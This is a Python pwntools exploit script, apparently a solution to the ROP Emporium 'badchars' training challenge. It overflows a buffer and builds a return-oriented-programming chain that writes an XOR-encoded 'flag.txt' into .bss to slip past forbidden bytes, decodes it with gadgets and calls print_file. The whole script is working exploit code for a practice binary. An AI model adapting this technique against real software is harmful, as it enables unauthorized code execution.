from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

elf = ELF('./badchars')
rop = ROP(elf)
io = process(elf.path)

bss = elf.bss()  
print_file = elf.plt['print_file']

flag_str = b"flag.txt"
xor_key = 2

pop_r12_r13_r14_r15 = 0x40069c           
mov_r13_r12 = 0x400634         
xor_r15_r14 = 0x400628         
ret = 0x4004ee         
pop_rdi = 0x4006a3           

encoded_string = bytearray()
for char in flag_str:
    encoded_char = char ^ xor_key
    encoded_string.append(encoded_char)
encoded_string = bytes(encoded_string)

offset = 40
payload = b'A' * offset

payload += p64(pop_r12_r13_r14_r15)        
payload += encoded_string        
payload += p64(bss)    
payload += p64(0)                
payload += p64(0)                
payload += p64(mov_r13_r12)       

for index in range(len(flag_str)):
    payload += p64(pop_r12_r13_r14_r15)   
    payload += p64(0)            
    payload += p64(0)            
    payload += p64(xor_key)      
    payload += p64(bss + index) 
    payload += p64(xor_r15_r14)   
      
payload += p64(pop_rdi)
payload += p64(bss)    
payload += p64(print_file)

io.sendlineafter(b'> ', payload)
io.interactive()